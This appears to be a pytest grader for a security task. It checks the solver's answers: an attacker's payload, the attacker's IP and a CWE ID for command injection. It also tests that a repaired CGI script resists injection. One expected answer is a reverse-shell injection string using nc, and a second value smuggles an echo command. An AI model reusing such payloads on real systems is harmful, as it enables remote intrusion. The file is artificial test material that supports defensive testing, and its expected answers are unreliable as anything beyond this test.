# test_final_state.py
import os
import subprocess
import pytest

def test_attacker_payload():
    path = "/home/user/attacker_payload.txt"
    assert os.path.exists(path), f"{path} does not exist"
    with open(path, "r") as f:
        content = f.read().strip()
    assert content == "; nc -e /bin/sh 10.10.10.10 4444", f"Incorrect payload in {path}: {content}"

def test_attacker_ip():
    path = "/home/user/attacker_ip.txt"
    assert os.path.exists(path), f"{path} does not exist"
    with open(path, "r") as f:
        content = f.read().strip()
    assert content == "172.16.4.101", f"Incorrect IP in {path}: {content}"

def test_cwe_id():
    path = "/home/user/cwe_id.txt"
    assert os.path.exists(path), f"{path} does not exist"
    with open(path, "r") as f:
        content = f.read().strip().upper()
    assert content in ["CWE-78", "CWE-77"], f"Incorrect CWE ID in {path}: {content}"

def test_secure_search_cgi():
    path = "/home/user/secure_search.cgi"
    assert os.path.exists(path), f"{path} does not exist"
    assert os.path.isfile(path), f"{path} is not a file"
    assert os.access(path, os.X_OK), f"{path} is not executable"

    # Test for command injection
    env = os.environ.copy()
    env["QUERY_STRING"] = "q=;echo INJECTION_SUCCESS"

    # Create a dummy data file so grep doesn't fail if it relies on it
    os.makedirs("/var/www", exist_ok=True)
    with open("/var/www/data.txt", "w") as f:
        f.write("dummy data\n")

    result = subprocess.run(
        [path],
        env=env,
        capture_output=True,
        text=True
    )

    assert "INJECTION_SUCCESS" not in result.stdout, "Command injection still possible in secure_search.cgi"
    assert "INJECTION_SUCCESS" not in result.stderr, "Command injection still possible in secure_search.cgi"